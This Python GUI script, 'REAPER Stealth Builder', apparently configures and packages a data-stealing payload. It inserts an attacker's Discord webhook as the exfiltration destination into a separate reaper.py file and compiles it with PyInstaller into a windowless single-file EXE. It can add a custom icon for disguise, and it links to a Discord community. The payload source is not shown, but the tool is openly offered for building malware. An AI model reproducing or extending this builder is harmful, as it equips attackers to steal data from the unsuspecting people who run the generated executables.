import os
import shutil
import webbrowser
import threading
from tkinter import filedialog, messagebox
import customtkinter as ctk

# --- INITIAL SETUP ---
PROJECT_DIR = "Build_Project"
FILE_NAME = 'reaper.py' 
ctk.set_appearance_mode("dark")

def setup_files():
    if not os.path.exists(PROJECT_DIR):
        os.makedirs(PROJECT_DIR)
    if os.path.exists(FILE_NAME) and not os.path.exists(os.path.join(PROJECT_DIR, FILE_NAME)):
        shutil.move(FILE_NAME, os.path.join(PROJECT_DIR, FILE_NAME))
    try:
        os.chdir(PROJECT_DIR)
    except:
        pass

setup_files()

# --- COSMETICS ---
BG_MAIN = "#08080a"
CARD_COLOR = "#0f0f12"
VIOLET = "#8b5cf6"
VIOLET_GLOW = "#c084fc"
SUCCESS_GREEN = "#10b981"
ERROR_RED = "#ef4444"

# --- CORE LOGIC ---
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("System Error", f"Source file '{FILE_NAME}' is missing.")
        return False
    with open(FILE_NAME, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    with open(FILE_NAME, 'w', encoding='utf-8') as f:
        for line in lines:
            if line.strip().startswith('h00k ='):
                f.write(f'h00k = "{webhook}"\n')
            else:
                f.write(line)
    return True

def run_build():
    webhook = entry.get().strip()
    if not validate_webhook(webhook):
        status_label.configure(text="● INVALID WEBHOOK", text_color=ERROR_RED)
        return

    if replace_webhook(webhook):
        icon_option = ""
        if check_var.get() == "on":
            icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
            if icon_path: icon_option = f' --icon="{icon_path}"'
        
        status_label.configure(text="● COMPILING PAYLOAD...", text_color=VIOLET)
        build_btn.configure(state="disabled", text="PLEASE WAIT...")
        
        # Run in thread to prevent UI freezing
        def compile_process():
            # Standard pyinstaller flags for a clean build
            os.system(f'pyinstaller --noconsole --onefile --clean --noconfirm{icon_option} {FILE_NAME}')
            status_label.configure(text="● BUILD COMPLETE", text_color=SUCCESS_GREEN)
            build_btn.configure(state="normal", text="RE-INITIALIZE")
            messagebox.showinfo("REAPER", "Payload successfully generated in /dist")

        threading.Thread(target=compile_process).start()

# --- INTERFACE ---
app = ctk.CTk()
app.title("REAPER")
app.geometry("520x600")
app.configure(fg_color=BG_MAIN)
app.resizable(False, False)

# Top Bar Decoration
top_bar = ctk.CTkFrame(app, height=4, fg_color=VIOLET, corner_radius=0)
top_bar.pack(side="top", fill="x")

# Hero Section
header = ctk.CTkFrame(app, fg_color="transparent")
header.pack(pady=(50, 30))

ctk.CTkLabel(header, text="REAPER", font=("Impact", 60), text_color=VIOLET).pack()
ctk.CTkLabel(header, text="V 1 . 1  -  S T E A L T H  B U I L D E R", 
             font=("Arial Bold", 12), text_color="#4b5563").pack(pady=(0, 10))

# Content Card
card = ctk.CTkFrame(app, fg_color=CARD_COLOR, corner_radius=20, border_width=1, border_color="#1f2937")
card.pack(padx=40, fill="both", expand=True, pady=(0, 40))

# Webhook Input
ctk.CTkLabel(card, text="DESTINATION WEBHOOK", font=("Arial Bold", 11), text_color=VIOLET_GLOW).pack(pady=(30, 5))
entry = ctk.CTkEntry(card, width=340, height=45, placeholder_text="https://discord.com/api/webhooks/...", 
                     fg_color=BG_MAIN, border_color="#374151", corner_radius=12, border_width=2)
entry.pack(pady=5)

# Build Options
check_var = ctk.StringVar(value="off")
checkbox = ctk.CTkCheckBox(card, text="Embed Custom Icon (.ico)", variable=check_var, 
                           onvalue="on", offvalue="off", font=("Arial Semibold", 12),
                           fg_color=VIOLET, hover_color=VIOLET_GLOW, border_color="#4b5563")
checkbox.pack(pady=25)

# Main Action
build_btn = ctk.CTkButton(card, text="BUILD STANDALONE EXE", width=300, height=55, corner_radius=15,
                          font=("Arial Bold", 15), fg_color=VIOLET, hover_color="#7c3aed", 
                          command=run_build)
build_btn.pack(pady=(10, 20))

# Status Bar
status_label = ctk.CTkLabel(card, text="● SYSTEM READY", font=("Consolas Bold", 12), text_color="#9ca3af")
status_label.pack(pady=(0, 20))

# Footer Socials
footer = ctk.CTkFrame(app, fg_color="transparent")
footer.pack(side="bottom", pady=20)
disc = ctk.CTkLabel(footer, text="JOIN THE COMMUNITY", font=("Arial Bold", 10), text_color="#6366f1", cursor="hand2")
disc.bind("<Button-1>", lambda e: webbrowser.open("https://discord.gg/r77ndghBv8"))
disc.pack()

app.mainloop()